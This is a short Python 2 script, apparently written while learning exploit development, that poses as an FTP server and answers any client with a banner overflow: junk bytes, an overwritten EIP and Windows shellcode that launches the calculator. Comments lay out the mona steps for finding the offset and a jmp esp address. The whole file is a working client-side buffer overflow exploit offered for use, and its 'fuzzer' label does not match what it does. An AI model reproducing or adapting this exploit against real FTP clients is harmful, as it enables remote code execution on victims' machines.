## Created by petr pospisil
## A simple FTP fuzzer 
## resenderemailforme@gmail.com

#!/usr/bin/python
from socket import *

## Find buffer overflow
## Force app to crash by it - pust there huge payload
## Find EIP

## Use mona to create payload and push to the input
## Use mona to calculate correct offset by asking for EIP
## Use mona to find call/jumps to EIP and use it as new EIP
## Create payload = Junk bytes + EIP + Shell Code 


### Commands:
#### !mona modules 				                  # check ASLR = dynamic change of addresses in memory > different location after reboot
#### !mona create_pattern <n junk bytes>  	# create a payloads to calculate payload offset
#### !mona jmp -r esp -m kernel 		        # find all the jumms/calls to EIP
#### !mona pattern_offset <EIP> 		        # get offset > size of payloads before EIP

#payload = 1000 * 'A'
#payload = 1000 * '\xc3' 		                # Malformed A 

JUNK_BYTES = 989 * '\xc3'
EIP = '\x24\x54\xA6\x77'
SHELLCODE = '\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7'

payload = JUNK_BYTES
payload += EIP
payload += SHELLCODE

ip_addr = '127.0.0.1'
port = 21

s = socket(AF_INET, SOCK_STREAM)
s.bind((ip_addr, port))
s.listen(1)
print '[+] Listening on [FTP] ' + ip_addr + ':' + str(port)
print '[+] Payload: ' + str(len(JUNK_BYTES)) + ' junk bytes + EIP: ' + EIP + ' + ' + str(len(SHELLCODE)/4) + ' shellcode bytes => Payload: ' + str(len(payload)) + ' bytes'

c, addr = s.accept()
print '[+] Connection accepted from: %s' % (addr[0])
c.send("220 "+payload+"\r\n")
print '[+] Payload has been sent.'
c.recv(1024)
c.close()
print '[+] Client exploited!'
print '[+] Nothing to do here...'
s.close()
